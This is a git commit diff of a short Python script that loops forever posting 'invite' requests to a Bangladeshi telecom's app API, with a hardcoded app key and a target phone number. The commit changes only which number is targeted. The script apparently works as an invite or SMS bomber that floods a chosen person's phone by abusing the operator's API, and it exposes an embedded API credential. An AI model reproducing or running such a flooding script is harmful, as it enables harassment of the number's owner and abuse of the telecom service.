ca75c76348b7e36a091b8cefb7cb0d05b5127d56
Mr. Foisal <83734733+MohammadFoisal@users.noreply.github.com>
2022-01-10 10:40:24 +0600

    Update invi.py

--- invi.py
+++ invi.py
@@ -3,7 +3,7 @@ print("Auto Error Blast!!!")
 Key = input("Enter Lkey: ")
 while 1:
       url2 = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=sendContactList&action=invite'
-      myobj0 = {'data':'[{ "msisdn": "8801819400400" }]'}
+      myobj0 = {'data':'[{ "msisdn": "8801833268701" }]'}
       try:
         x=requests.post(url2, data = myobj0, headers = {"x-api-key": Key,"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})      
         print(x.text)
